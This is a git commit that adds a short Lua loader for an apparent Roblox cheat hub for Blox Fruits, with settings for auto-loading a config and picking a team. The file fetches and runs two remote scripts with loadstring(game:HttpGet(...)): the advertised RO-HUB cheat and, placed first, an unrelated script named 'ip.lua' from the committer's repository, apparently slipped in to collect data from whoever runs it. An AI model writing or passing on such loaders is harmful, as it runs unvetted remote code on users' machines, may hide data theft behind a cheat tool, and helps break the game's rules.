178545674091771afbb333a90fa97662bd858440
xielbers <88589081+xielbers@users.noreply.github.com>
2025-04-22 22:07:22 -0300

    Create blox-fruits_ro-hub.lua

---
+++ blox-fruits_ro-hub.lua
@@ -0,0 +1,8 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/copy/ip.lua'))()
+
+_G.settings = {
+    autoLoadConfig = true, -- self explanatory
+    joinTeam = "Pirates" -- "Pirates" or "Marines"
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RO-HUB-CODEX/RO-HUB/refs/heads/main/bloxfruits.lua"))()
